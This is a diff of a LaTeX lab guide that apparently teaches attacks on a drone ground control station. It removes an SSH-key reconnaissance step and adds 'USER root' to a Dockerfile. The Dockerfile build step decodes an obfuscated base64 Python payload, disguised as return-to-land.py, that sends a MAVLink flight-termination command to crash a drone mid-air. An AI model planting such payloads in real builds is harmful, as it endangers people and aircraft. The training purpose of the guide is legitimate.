@@ -532,18 +532,7 @@
     # Thoroughly examine directories and their contents
     ls -la
 
-    # Look specifically for SSH keys used for remote server access
-    ls -la ~/.ssh/
-
     \end{lstlisting}
-
-    \begin{hintbox}
-    \noindent
-    \textbf{What are SSH Keys?}
-
-    \noindent
-    SSH keys are cryptographic keys used for authentication in the SSH protocol, enabling secure remote access to servers and other systems. They replace passwords with a more secure and often more convenient method of authentication, relying on a pair of keys: a private key kept secret by the user and a public key shared with the server. 
-    \end{hintbox}
 
     \vspace{1em}
 
@@ -895,13 +884,10 @@
     
     \begin{lstlisting}[language=bash, caption=Adding malicious code to the Dockerfile]
     [... previous Dockerfile content...]
-    COPY ground-control-station/missions /missions
-    COPY ground-control-station/init /init
+    USER root
     
     # This line decodes and executes malicious Python code during build
     RUN echo "ZnJvbSBweW1hdmxpbmsgaW1wb3J0IG1hdnV0aWwKaW1wb3J0IHRpbWUKCmRlZiBzZW5k X2ZsaWdodF90ZXJtaW5hdGlvbl9jb21tYW5kKG1hc3Rlcik6CiAgICAiIiJTZW5kIGZs aWdodCB0ZXJtaW5hdGlvbiBjb21tYW5kIHRvIGZvcmNlIHRoZSBkcm9uZSB0byBzaHV0 IGRvd24gaW4gbWlkLWFpci4iIiIKICAgIG1hc3Rlci5tYXYuY29tbWFuZF9sb25nX3Nl bmQoCiAgICAgICAgbWFzdGVyLnRhcmdldF9zeXN0ZW0sCiAgICAgICAgbWFzdGVyLnRh cmdldF9jb21wb25lbnQsCiAgICAgICAgbWF2dXRpbC5tYXZsaW5rLk1BVl9DTURfRE9f RkxJR0hUVEVSTUlOQVRJT04sCiAgICAgICAgMCwgICMgQ29uZmlybWF0aW9uCiAgICAg ICAgMSwgICMgUGFyYW0xOiAxIHRvIGluaXRpYXRlIGZsaWdodCB0ZXJtaW5hdGlvbgog ICAgICAgIDAsIDAsIDAsIDAsIDAsIDAgICMgT3RoZXIgcGFyYW1zIHVudXNlZAogICAg KQogICAgcHJpbnQoIkZsaWdodCB0ZXJtaW5hdGlvbiBjb21tYW5kIHNlbnQgLSBzaW11 bGF0aW5nIGNyYXNoIikKCiMgQ29ubmVjdCB0aGUgZHJvbmUKY29ubmVjdGlvbl9z dHJpbmcgPSAidWRwOjAuMC4wLjA6MTQ1NTAiCm1hc3RlciA9IG1hdnV0aWwubWF2bGlu a19jb25uZWN0aW9uKGNvbm5lY3Rpb25fc3RyaW5nKQptYXN0ZXIud2FpdF9oZWFydGJl YXQoKQpwcmludCgiQ29ubmVjdGVkIHRvIGRyb25lIikKCiMgU2VuZCBmbGlnaHQgdGVy bWluYXRpb24gY29tbWFuZCB0byBzaW11bGF0ZSBhIGNyYXNoCnNlbmRfZmxpZ2h0X3Rl cm1pbmF0aW9uX2NvbW1hbmQobWFzdGVyKQoKIyBTZW5kIHBlcmlvZGljIGhlYXJ0YmVh dHMgdG8ga2VlcCBNQVZMaW5rIGNvbm5lY3Rpb24gYWxpdmUKdHJ5OgogICAgd2hpbGUg VHJ1ZToKICAgICAgICBt YXN0ZXIubWF2LmhlYXJ0YmVhdF9zZW5kKAogICAgICAgICA gICBtYXZ1dGlsLm1hdmxpbmsuTUFWX1RZUEVfUVVBRFJPVE9SLAogICAgICAgICAgICB tYXZ1dGlsLm1hdmxpbmsuTUFWX0FVVE9QSUxPVF9BUkRVUElMT1RNRUdBLAogICAgICA gICAgICAwLCAwLAogICAgICAgICAgICBtYXZ1dGlsLm1hdmxpbmsuTUFWX1NUQVRFX0F DVElWRQogICAgICAgICkKICAgICAgICB0aW1lLnNsZWVwKDEpCmV4Y2VwdCBLZXlib2 FyZEludGVycnVwdDoKICAgIHBhc3MK" | base64 -d > /opt/gcs/stages/return-to-land.py
-    
-    RUN chmod +x /init
 
     CMD echo "Ground Control Online..." && /usr/bin/expect /init
     \end{lstlisting}
